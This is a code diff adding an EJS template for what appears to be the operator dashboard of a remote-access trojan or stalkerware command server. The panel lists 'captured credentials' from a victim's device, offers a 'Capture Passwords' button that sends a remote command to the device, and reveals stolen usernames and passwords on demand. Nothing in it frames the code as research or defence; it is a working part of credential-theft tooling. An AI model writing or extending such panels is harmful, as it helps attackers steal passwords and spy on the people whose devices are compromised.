@@ -1,0 +1,61 @@
+<div class="glass rounded-xl p-6">
+    <h3 class="text-white font-semibold text-lg mb-2">Passwords & Accounts</h3>
+    <p class="text-slate-400 text-sm mb-4">Captured credentials and account information from the device.</p>
+
+    <div class="flex gap-3 mb-4">
+        <button onclick="updateButton(this, '0xCO')" class="btn-primary text-sm">Sync Contacts</button>
+        <button onclick="capturePasswords()" class="btn-primary text-sm">Capture Passwords</button>
+    </div>
+
+    <div class="space-y-3">
+        <% if (typeof pageData !== 'undefined' && pageData.length > 0) { %>
+        <% pageData.forEach(function(acc) { %>
+        <div class="glass-bright rounded-lg p-4">
+            <div class="flex items-center gap-3 mb-2">
+                <div class="w-8 h-8 rounded-full bg-accent-blue/20 flex items-center justify-center">
+                    <svg class="w-4 h-4 text-accent-blue" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/></svg>
+                </div>
+                <div>
+                    <div class="text-white font-medium text-sm"><%= acc.name || acc.service || 'Account' %></div>
+                    <div class="text-slate-400 text-xs"><%= acc.type || 'credential' %></div>
+                </div>
+            </div>
+            <% if (acc.username) { %>
+            <div class="flex items-center gap-2 ml-11 text-sm">
+                <span class="text-slate-400">User:</span>
+                <span class="text-white font-mono"><%= acc.username %></span>
+            </div>
+            <% } %>
+            <% if (acc.password) { %>
+            <div class="flex items-center gap-2 ml-11 text-sm">
+                <span class="text-slate-400">Pass:</span>
+                <span class="text-accent-red font-mono password-field" data-pass="<%= acc.password %>">••••••••</span>
+                <button class="text-slate-500 hover:text-white text-xs" onclick="togglePass(this)">Show</button>
+            </div>
+            <% } %>
+        </div>
+        <% }); %>
+        <% } else { %>
+        <p class="text-slate-500 text-center py-8">No credentials captured yet. Click "Capture Passwords" to scan.</p>
+        <% } %>
+    </div>
+</div>
+
+<script>
+    function capturePasswords() {
+        sendCommand('0xCO', {}, function(error, data) {
+            if (error) showNotification('#f03434', error);
+            else showNotification('#2ecc71', 'Password capture requested');
+        });
+    }
+    function togglePass(btn) {
+        var field = btn.previousElementSibling;
+        if (field.textContent === '••••••••') {
+            field.textContent = field.dataset.pass;
+            btn.textContent = 'Hide';
+        } else {
+            field.textContent = '••••••••';
+            btn.textContent = 'Show';
+        }
+    }
+</script>
